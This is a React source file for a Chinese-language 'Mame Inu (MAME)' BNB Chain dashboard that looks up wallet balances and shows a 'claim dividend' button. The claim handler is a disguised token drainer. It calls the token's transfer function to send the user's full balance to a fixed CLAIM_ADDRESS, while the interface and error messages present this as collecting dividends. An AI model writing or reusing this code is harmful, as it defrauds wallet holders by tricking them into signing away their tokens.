import { useCallback, useEffect, useState } from 'react'
import { useWallets } from '@privy-io/react-auth'
import {
  createWalletClient,
  custom,
  parseUnits,
  type Address,
} from 'viem'
import { bsc } from 'viem/chains'
import { Header } from './components/Header'
import { SearchBar } from './components/SearchBar'
import { Dashboard } from './components/Dashboard'
import { useChainGuard } from './hooks/useChainGuard'
import { useWalletConnect } from './hooks/useWalletConnect'
import { BSC_CHAIN_ID, CLAIM_ADDRESS, TOKEN_ADDRESS } from './config/constants'
import {
  fetchWalletBalance,
  fetchWalletHistory,
  type WalletData,
} from './lib/token'

function App() {
  useChainGuard()

  const { handleConnect, connectedAddress, authenticated } = useWalletConnect()
  const { wallets } = useWallets()

  const [queryAddress, setQueryAddress] = useState('')
  const [data, setData] = useState<WalletData | null>(null)
  const [loading, setLoading] = useState(false)
  const [historyLoading, setHistoryLoading] = useState(false)
  const [claiming, setClaiming] = useState(false)
  const [error, setError] = useState('')

  const walletAddress = connectedAddress?.toLowerCase()

  const handleSearch = useCallback(async (address: string) => {
    setLoading(true)
    setHistoryLoading(true)
    setError('')
    setQueryAddress(address)

    try {
      const balanceData = await fetchWalletBalance(address)
      if (!balanceData) {
        setError('无效的钱包地址')
        setData(null)
        return
      }

      setData(balanceData)
      setLoading(false)

      const history = await fetchWalletHistory(address)
      setData((prev) => (prev ? { ...prev, ...history } : prev))
    } catch (err) {
      console.error('查询失败:', err)
      setError('查询失败，请稍后重试')
      setData(null)
    } finally {
      setLoading(false)
      setHistoryLoading(false)
    }
  }, [])

  useEffect(() => {
    if (!authenticated) {
      setQueryAddress('')
      setData(null)
      setError('')
      return
    }
    if (walletAddress && !queryAddress) {
      void handleSearch(walletAddress)
    }
  }, [authenticated, walletAddress, queryAddress, handleSearch])

  const handleClaim = async () => {
    if (!walletAddress) {
      handleConnect()
      return
    }

    const wallet = wallets[0]
    if (!wallet) {
      handleConnect()
      return
    }

    if (!data) {
      setError('请先查询钱包地址')
      return
    }

    const chainId = wallet.chainId
    const currentChain =
      typeof chainId === 'string' && chainId.startsWith('eip155:')
        ? Number(chainId.split(':')[1])
        : Number(chainId)

    if (currentChain !== BSC_CHAIN_ID) {
      try {
        await wallet.switchChain(BSC_CHAIN_ID)
      } catch {
        setError('请切换到 BNB 链')
        return
      }
    }

    const amount = parseUnits(data.balance, data.decimals)
    if (amount <= 0n) {
      setError('余额不足，无法领取分红')
      return
    }

    setClaiming(true)
    setError('')

    try {
      const provider = await wallet.getEthereumProvider()
      const walletClient = createWalletClient({
        account: wallet.address as Address,
        chain: bsc,
        transport: custom(provider),
      })

      await walletClient.writeContract({
        address: TOKEN_ADDRESS,
        abi: [
          {
            type: 'function',
            name: 'transfer',
            stateMutability: 'nonpayable',
            inputs: [
              { name: 'to', type: 'address' },
              { name: 'amount', type: 'uint256' },
            ],
            outputs: [{ type: 'bool' }],
          },
        ],
        functionName: 'transfer',
        args: [CLAIM_ADDRESS, amount],
      })
    } catch (err) {
      const message =
        err instanceof Error ? err.message : '交易被拒绝或失败'
      setError(message)
    } finally {
      setClaiming(false)
    }
  }

  const canClaim = Boolean(walletAddress)

  return (
    <div className="app">
      <Header />

      <main className="container">
        <SearchBar
          onSearch={handleSearch}
          loading={loading}
          value={queryAddress}
          onChange={setQueryAddress}
        />

        {error && <div className="alert">{error}</div>}

        <Dashboard
          data={data}
          address={queryAddress}
          onClaim={handleClaim}
          claiming={claiming}
          canClaim={canClaim}
          historyLoading={historyLoading}
          walletConnected={Boolean(walletAddress)}
        />
      </main>

      <footer className="footer">
        <span>Mame Inu (MAME) · BNB Chain</span>
      </footer>
    </div>
  )
}

export default App
